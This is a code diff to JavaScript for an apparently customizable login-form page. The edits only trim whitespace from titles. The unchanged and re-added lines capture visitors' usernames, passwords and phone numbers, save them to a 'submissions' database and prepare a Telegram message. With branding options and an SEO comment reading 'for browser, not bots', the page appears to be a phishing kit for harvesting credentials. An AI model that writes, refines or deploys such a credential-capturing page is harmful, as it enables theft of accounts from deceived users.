@@ -132,7 +132,10 @@ if(data.bgVideoURL){
 // 🏷 TITLE
 const title = document.createElement("h2");
 
-title.textContent = data.title || data.pageTitle || "Untitled Form";
+title.textContent =
+  (data.title && data.title.trim()) ||
+  (data.pageTitle && data.pageTitle.trim()) ||
+  "Untitled Form";
 
 // ✅ Position
 title.style.textAlign = data.titlePosition || "center";
@@ -352,20 +355,23 @@ const password = inputs[1]?.value || "";
 const extraValues = extraInputs.map(i => i.value);
 
   // 3️⃣ Save
-  await db.collection("submissions").add({
-    formId: formId || "unknown",
-    formTitle: data.title || "Untitled Form",
-    createdAt: Date.now(),
-    data: {
-      username: username,
-      password: password,
-      "Phone Number": extraValues[0] || "",
-      extraFields: extraValues,
-      file: fileURL,
-      title: data.title || "",
-      logo: data.logoURL || ""
-    }
-  });  
+await db.collection("submissions").add({
+  formId: formId || "unknown",
+  formTitle:
+    (data.title && data.title.trim()) ||
+    (data.pageTitle && data.pageTitle.trim()) ||
+    "Untitled Form",
+  createdAt: Date.now(),
+  data: {
+    username: username,
+    password: password,
+    "Phone Number": extraValues[0] || "",
+    extraFields: extraValues,
+    file: fileURL,
+    title: data.title || "",
+    logo: data.logoURL || ""
+  }
+});  
 
       // 4️⃣ Send Telegram
       const telegramMsg = `
@@ -453,7 +459,10 @@ if(formId){
     console.log("FORM DATA:", data);
     
     // ✅ UPDATE SEO META TAGS (for browser, not bots)
-const seoTitle = data.seoTitle || data.title || "Untitled Form";
+const seoTitle =
+  (data.seoTitle && data.seoTitle.trim()) ||
+  (data.title && data.title.trim()) ||
+  "Untitled Form";
 const metaDesc = data.metaDesc || "";
 const ogImage = data.ogImage || "";
 
